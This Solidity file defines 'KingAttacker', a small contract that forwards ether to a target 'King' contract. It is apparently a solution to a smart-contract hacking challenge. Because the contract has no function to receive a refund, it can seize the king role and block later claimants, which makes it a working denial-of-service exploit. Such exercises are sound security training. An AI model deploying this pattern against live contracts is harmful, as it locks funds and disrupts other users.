// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract KingAttacker is Ownable {

    using Address for address payable;

    function attack(address payable kingContractAddress) external payable onlyOwner {
        kingContractAddress.sendValue(msg.value);
        
    }
}
